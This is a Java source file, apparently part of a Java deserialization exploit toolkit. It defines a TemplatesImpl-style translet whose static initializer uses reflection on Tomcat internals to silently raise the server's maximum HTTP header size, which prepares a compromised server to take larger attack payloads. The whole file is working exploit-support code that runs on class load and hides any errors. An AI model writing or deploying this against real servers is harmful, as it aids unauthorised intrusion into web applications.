package com.sorry.utils.templatesimpl;

/**
*created by 0x22cb7139 on 2021/7/26
*/
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.*;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.Http11InputBuffer;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class TomcatHeaderSize extends AbstractTranslet {
    static {
        try {
            Field contextField = StandardContext.class.getDeclaredField("context");
            Field serviceField = ApplicationContext.class.getDeclaredField("service");
            Field requestField = RequestInfo.class.getDeclaredField("req");
            Field headerSizeField = Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            Method getHandlerMethod = AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            headerSizeField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            WebappClassLoaderBase webappClassLoaderBase =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            ApplicationContext applicationContext = (ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            StandardService standardService = (StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                if (4 == connectors[i].getScheme().length()) {
                    ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof AbstractHttp11Protocol) {
                        Class[] classes = AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                Field globalField = classes[j].getDeclaredField("global");
                                Field processorsField = RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                RequestGroupInfo requestGroupInfo = (RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    Request tempRequest = (Request) requestField.get(list.get(k));
                                    // 10000 为修改后的 headersize
                                    headerSizeField.set(tempRequest.getInputBuffer(),10000);
                                }
                            }
                        }
                        // 10000 为修改后的 headersize
                        ((AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
